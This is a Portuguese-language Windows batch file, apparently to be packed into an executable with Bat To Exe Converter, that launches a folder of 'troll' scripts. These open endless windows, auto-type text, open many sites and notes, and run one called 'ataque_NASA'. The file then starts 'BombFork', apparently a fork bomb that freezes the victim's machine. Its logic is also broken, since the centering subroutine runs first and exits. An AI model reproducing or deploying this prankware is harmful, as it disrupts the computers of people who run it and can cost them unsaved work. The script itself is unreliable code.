::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWGLVpRhhfkEAFESjEVb6b5YO7env5uSA4mglcYI=
::fBE1pAF6MU+EWGLVpRhhfkEAFESjEVb6b5MV5O317ueC+A0+Dt4LaoDX1oirOOUQ1mr0cIQsll1ipM0ZCB5ccQDlaxcxyQ==
::fBE1pAF6MU+EWGLVpRhhfkEAFESjEVb6b5MT+uX6+7DH8R9ddusrOJOb+buAM+8f7wWsQ58+33hWnYJs
::fBE1pAF6MU+EWGLVpRhhfkEAFESjEVb6b5QY7OH16KqVp14SQfA8fZyVlPrOD8tz
::fBE1pAF6MU+EWGLVpRhhfkEAFUSjEVb6b4UO5+v+/PnHpEQTXfE3fYu7
::fBE1pAF6MU+EWGLVpRhhf0EEFUSjEVb6b5YO7env5uSA4mglcYI=
::fBE1pAF6MU+EWGLVpRhhf0EEFUSjEVb6b5MV5O317ueC+A0+Dt4LaoDX1oirOOUQ1mr0cIQsll1ipM0ZCB5ccQDlaxcxyQ==
::fBE1pAF6MU+EWGLVpRhhf0EEFUSjEVb6b5MT+uX6+7DH8R9ddusrOJOb+buAM+8f7wWsQ58+33hWnYJs
::fBE1pAF6MU+EWGLVpRhhf0EEFUSjEVb6b5QY7OH16KqVp14SQfA8fZyVlPrOD8tz
::fBE1pAF6MU+EWGLVpRhhf0EEFUSjEVb6b4UO5+v+/PnHpEQTXfE3fYu7
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFBRATRKLAE+1EbsQ5+n//NaIskgPVd04YLDZyLuZM+UB1UnrcpkS33lVlvRdWUkBKUTlZww7yQ==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJG2W+048FD5MSQe+E3u/FLRcz9DHwPqCsEw6bKw6YIq7
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
cls
setlocal enabledelayedexpansion

rem Função para centralizar o texto
:print_centered
set "str=%~1"
set "cols=80"
set /a "spaces=(cols - len)/2"
set "padding="
for /l %%a in (1,1,!spaces!) do set "padding=!padding! "
echo !padding!%str%
goto :eof

rem Comprimento do texto
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get currenthorizontalresolution /value') do set /a len=%%a / 8

@echo.
call :print_centered "***********************************************"
call :print_centered "***                                         ***"
call :print_centered "***         AGORA FUDEUUUUUUU!              ***"
call :print_centered "***                                         ***"
call :print_centered "***********************************************"
@echo.

rem Navega para o diretório trolls e inicia scripts
cd trolls
start janelas_infinitas.bat
timeout 1
start auto_digitar.bat
timeout 1
start ataque_NASA.bat
timeout 1
start Abrir_varios_sites.bat
timeout 1
start abrir_notas.bat
timeout 4

rem Finaliza os processos dos scripts
taskkill /IM abrir_notas.bat /F
taskkill /IM Abrir_varios_sites.bat /F
taskkill /IM ataque_NASA.bat /F
taskkill /IM auto_digitar.bat /F
taskkill /IM janelas_infinitas.bat /F

@echo off
cls
@echo.
call :print_centered "***********************************************"
call :print_centered "***                                         ***"
call :print_centered "***         Agora Fudeu de vez,             ***"
call :print_centered "***          PISQUE O CU LENTAMENTE         ***"
call :print_centered "***                                         ***"
call :print_centered "***********************************************"
@echo.

timeout 10
start BombFork
